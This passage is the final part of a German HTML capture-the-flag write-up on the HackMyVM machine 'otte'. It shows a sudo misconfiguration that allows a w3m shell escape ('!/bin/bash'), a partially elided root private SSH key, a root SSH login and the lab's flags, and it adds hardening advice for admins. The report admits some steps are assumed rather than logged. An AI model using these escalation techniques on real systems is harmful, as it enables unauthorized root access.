+                    <div class="prompt">laetitia@otte:/home/thomas$ <span class="command">sudo -l</span></div>
+                     <pre>
+Matching Defaults entries for laetitia on otte:
+    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin
+
+User laetitia may run the following commands on otte:
+    <span class="command">(cedric) NPASSWD: /usr/bin/w3m *</span> <span class="comment"># Kann w3m als cedric ausführen</span>
+                    </pre>
+                    <div class="prompt">laetitia@otte:/home/thomas$ <span class="command">sudo -u cedric /usr/bin/w3m https://google.de</span></div>
+                      <pre>
+<span class="comment"># Innerhalb von w3m:</span>
+Anmelden: <span class="command">!/bin/bash</span> <span class="comment"># Shell-Escape Versuch (funktioniert oft mit '!')</span>
+                      </pre>
+                    <!-- Keine klare Bestätigung im Log, dass dies funktionierte -->
+                    <!-- Alternative Versuche im Log -->
+                    <div class="prompt">laetitia@otte:/home/thomas$ <span class="command">sudo -u cedric /usr/bin/w3m https://google.de</span></div>
+                    <div class="prompt">laetitia@otte:/home/thomas$ <span class="command">sudo -u cedric /usr/bin/w3m https://google.de</span></div>
+                 </div>
+             </div>
+             <p class="analysis">
+                **Analyse:** `sudo -l` als `laetitia` zeigt, dass sie den Textbrowser `w3m` mit beliebigen Argumenten (`*`) als Benutzer `cedric` ohne Passwort ausführen darf. Der Pentester startet `w3m` mit `sudo -u cedric`. Innerhalb von `w3m` wird versucht, durch Eingabe von `!/bin/bash` (ein gängiger Shell-Escape-Befehl für viele Konsolentools) eine Shell zu starten. Die Wiederholung des Befehls deutet darauf hin, dass es möglicherweise nicht sofort funktionierte oder der genaue Ablauf unklar war.
+            </p>
+            <p class="evaluation">
+                **Bewertung:** Die `sudo`-Regel für `w3m` ist ein weiterer klarer PrivEsc-Vektor. Viele Konsolenprogramme wie Textbrowser oder Editoren erlauben das Ausführen externer Befehle. Wenn dies über `sudo` geschieht, läuft der externe Befehl als der Zielbenutzer.
+            </p>
+             <p class="recommendation">
+                **Empfehlung (Pentester):** Den Shell-Escape innerhalb von `w3m` (oft `!`, gefolgt vom Befehl) verwenden, um eine Shell als `cedric` zu erhalten (`!/bin/bash` oder `!sh`).<br>
+                **Empfehlung (Admin):** Die gefährliche `sudo`-Regel für `w3m` entfernen. Interaktive Programme sollten nicht über `sudo` ausgeführt werden können, es sei denn, sie sind speziell dafür gehärtet (z.B. `sudoedit`).
+            </p>
+             <!-- Annahme: Shell als cedric wurde erlangt, obwohl im Log nicht explizit gezeigt -->
+
+            <h3 id="privesc-root">Eskalation zu root (via SSH Key)</h3>
+            <p class="analysis">
+                **Analyse:** (Implizit, nicht im Log gezeigt) Als Benutzer `cedric` wurde weiter enumeriert. Dabei wurde offenbar der private SSH-Schlüssel des `root`-Benutzers gefunden (z.B. in `/home/cedric/.ssh` oder einem anderen Ort, auf den `cedric` Zugriff hat).
+            </p>
+            <div class="code-block">
+                 <div class="terminal">
+                     <!-- Privater SSH Key von root (gefunden als cedric) -->
+                      <pre>
+<span class="password">-----BEGIN OPENSSH PRIVATE KEY-----
+b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABFwAAAAdzc2gtcn
+[...]
+nZE6YicYYwXU/lWaIm9bZSgh+XSu3MNd9Q4OjysM+uwNAAAAgQCT6o1Zbmud8n5Ly98Ixt
+[...]
+KbQZITee+LQmWDwn6owBoop8e+AAAAIEA4yBD324kr4sYaSdywvM0cnGPAOWTM5GBRNiDa
+[...]
+wI+xVl5iRx+RMjL27swjGkDarDoMbHFzaTSdEee0wIGLId/yKLCqGRnwbIRnuyGrxsTEk
+mrTAAAACXJvb3RAb3R0ZQE=
+-----END OPENSSH PRIVATE KEY-----</span>
+                     </pre>
+                 </div>
+            </div>
+            <p class="evaluation">
+                 **Bewertung:** Das ist der finale Schlüssel zur Root-Eskalation. Der private SSH-Schlüssel des `root`-Benutzers wurde kompromittiert.
+            </p>
+
+            <div class="code-block">
+                 <div class="terminal">
+                     <!-- Auf Angreifer-Maschine -->
+                     <div class="prompt">┌──(root㉿Darkspirit)-[~]
+└─# <span class="command">vi idtt</span></div> <span class="comment"># Speichern des root-Keys</span>
+                    <div class="prompt">┌──(root㉿Darkspirit)-[~]
+└─# <span class="command">chmod 600 idtt</span></div>
+                    <div class="prompt">┌──(root㉿cyber)-[~] <span class="comment"># Prompt wechselt? Egal.</span>
+└─# <span class="command">ssh root@otte.hmv -i idtt</span></div> <span class="comment"># Login mit root-Key</span>
+                    <pre>
+[...]
+Last login: Mon May 17 14:40:55 2021 from 192.168.0.28
+<span class="prompt">root@otte:~#</span> <span class="comment"># Root-Shell erhalten!</span>
+                     </pre>
+                 </div>
+            </div>
+             <p class="analysis">
+                 **Analyse:** Der gefundene private Schlüssel von `root` wird auf der Angreifer-Maschine in die Datei `idtt` gespeichert und die Berechtigungen werden auf `600` gesetzt. Anschließend wird mit diesem Schlüssel eine SSH-Verbindung als `root` zum Zielsystem `otte.hmv` aufgebaut. Der Login ist erfolgreich.
+             </p>
+             <p class="evaluation">
+                 **Bewertung:** Privilege Escalation zu `root` erfolgreich abgeschlossen.
+             </p>
+             <p class="recommendation">
+                 **Empfehlung (Pentester):** Root-Flag suchen und auslesen.<br>
+                 **Empfehlung (Admin):** Den kompromittierten privaten SSH-Schlüssel von `root` sofort sperren (aus `authorized_keys` entfernen). Untersuchen, wie der Schlüssel kompromittiert werden konnte (wahrscheinlich durch unsichere Berechtigungen im Dateisystem, auf die `cedric` Zugriff hatte). SSH-Root-Login idealerweise deaktivieren (`PermitRootLogin prohibit-password` oder `no`). Alle `sudo`-Schwachstellen beheben.
+             </p>
+        </section>
+
+        <!-- Angepasster Flags-Abschnitt -->
+        <section id="flags">
+             <div class="flag-container">
+                 <h2 class="flag-heading">Flags</h2>
+                 <div class="flag-entry">
+                     <!-- User-Flag aus Log geholt (als gabriel gelesen) -->
+                     <div class="flag-command">cat /home/gabriel/user.txt</div>
+                     <div class="flag-value"><span class="password">HMViwazhere</span></div>
+                 </div>
+                 <div class="flag-entry">
+                      <!-- Root-Flag aus Log geholt (rootflag.txt -> umbenannt) -->
+                     <div class="flag-command">cat /root/root.txt</div>
+                     <div class="flag-value"><span class="password">HMVohmygod</span></div>
+                 </div>
+             </div>
+         </section>
+
+ 
+
+    <footer class="footer">
+        <p>DarkSpirit - Cyber Security Reports</p>
+        <!-- Datum aus Logs extrahiert -->
+        <p>Berichtsdatum: 17. Oktober 2022</p> <!-- Datum von Stegseek/Hydra/wget übernommen -->
+    </footer>
+</body>
+</html>
